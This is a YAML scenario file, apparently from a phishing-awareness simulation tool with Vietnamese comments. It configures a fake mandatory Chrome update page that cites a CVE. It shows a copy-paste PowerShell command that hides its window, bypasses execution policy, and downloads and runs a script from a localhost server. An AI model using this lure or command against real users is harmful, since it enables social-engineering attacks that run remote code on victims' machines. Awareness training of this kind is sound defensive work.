# ============================================================
# KỊCH BẢN 3: Browser Update Required
# Giả mạo thông báo cập nhật Chrome / Edge bắt buộc
# Kỹ thuật hay dùng trong các trang web bị xâm phạm (watering hole)
# ============================================================

type: update
template: lures/browser_update.html
route: /update-required

payload:
  # JS tracker runs in browser; PS1 command shown in overlay for copy-paste
  script: "default.js"

content:
  browser_name: "Google Chrome"
  browser_version: "124.0.6367.60"
  latest_version: "136.0.7103.92"
  title: "Cập Nhật Chrome Bắt Buộc"
  description: "Phiên bản Chrome của bạn đã lỗi thời và có lỗ hổng bảo mật nghiêm trọng (CVE-2025-4664). Cập nhật ngay để bảo vệ thiết bị."
  release_date: "04/06/2026"
  display_command: "powershell -w h -ep bypass -c \"IEX (iwr 'http://localhost:8080/api/payloads/awareness.ps1' -UseBasicParsing).Content\""

styles:
  theme: "chrome"
  primary_color: "#1A73E8"
